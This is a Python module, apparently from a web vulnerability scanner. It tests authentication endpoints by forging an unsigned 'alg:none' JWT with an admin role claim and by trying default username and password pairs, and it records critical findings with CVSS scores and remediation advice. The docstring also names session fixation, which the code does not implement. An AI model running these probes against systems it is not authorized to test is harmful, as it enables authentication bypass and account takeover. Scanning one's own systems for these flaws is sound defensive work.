"""
Auth Scanner — JWT alg:none, default credentials, session fixation
"""

import requests
import base64
import json
import time


class AuthScanner:
    def __init__(self, target, endpoints, waf_detected=None):
        self.target = target
        self.endpoints = endpoints
        self.waf_detected = waf_detected
        self.request_count = 0
        self.bypass_rate = 0
        self.session = requests.Session()
        self.session.timeout = 8

    def run(self):
        findings = []

        # Test JWT alg:none
        jwt_findings = self._test_jwt_alg_none()
        findings.extend(jwt_findings)

        # Test default credentials
        cred_findings = self._test_default_credentials()
        findings.extend(cred_findings)

        return findings

    def _test_jwt_alg_none(self):
        """Craft a JWT with alg:none and see if the server accepts it."""
        findings = []
        auth_endpoints = [e for e in self.endpoints
                         if any(k in e.get("url", "").lower()
                                for k in ["auth", "login", "token", "api", "user"])]

        for endpoint in auth_endpoints[:3]:  # Limit to first 3 auth-like endpoints
            url = endpoint.get("url", "")
            try:
                # Craft alg:none JWT
                header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).rstrip(b"=").decode()
                payload = base64.urlsafe_b64encode(
                    json.dumps({"sub": "1", "role": "admin", "exp": 9999999999}).encode()
                ).rstrip(b"=").decode()
                fake_token = f"{header}.{payload}."

                resp = self.session.get(
                    url,
                    headers={"Authorization": f"Bearer {fake_token}"}
                )
                self.request_count += 1

                if resp.status_code == 200 and "unauthorized" not in resp.text.lower():
                    # CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
                    # Full auth bypass, no user interaction, network exploitable
                    findings.append({
                        "type": "JWT Algorithm Confusion (alg:none)",
                        "severity": "critical",
                        "endpoint": url,
                        "parameter": "Authorization header",
                        "payload": f"Bearer {fake_token[:40]}...",
                        "cvss": "9.8",
                        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "vector": "Auth Bypass",
                        "bypass_used": False,
                        "bypass_technique": None,
                        "remediation": (
                            "Explicitly whitelist allowed JWT algorithms server-side. "
                            "Reject tokens with alg:none or unexpected algorithm values. "
                            "Use a hardened, actively maintained JWT library."
                        ),
                    })
            except Exception:
                pass
            time.sleep(0.1)

        return findings

    def _test_default_credentials(self):
        """Test common default credential pairs."""
        findings = []
        creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("root", "root"), ("test", "test"),
        ]
        login_endpoints = [e for e in self.endpoints
                          if "login" in e.get("url", "").lower()]

        for endpoint in login_endpoints[:2]:
            url = endpoint.get("url", "")
            for user, pwd in creds:
                try:
                    resp = self.session.post(url, data={"username": user, "password": pwd})
                    self.request_count += 1
                    if resp.status_code == 200 and any(
                        k in resp.text.lower() for k in ["dashboard", "welcome", "token", "success"]
                    ):
                        # CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
                        # Default creds = full account takeover, no privileges required
                        findings.append({
                            "type": "Default Credentials Accepted",
                            "severity": "critical",
                            "endpoint": url,
                            "parameter": "username/password",
                            "payload": f"{user}:{pwd}",
                            "cvss": "9.8",
                            "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            "vector": "Auth Bypass",
                            "bypass_used": False,
                            "bypass_technique": None,
                            "remediation": (
                                "Remove all default credentials immediately. "
                                "Enforce strong password policy on all accounts. "
                                "Implement account lockout after failed attempts. "
                                "Add MFA to all privileged accounts."
                            ),
                        })
                        break
                except Exception:
                    pass
                time.sleep(0.1)

        return findings
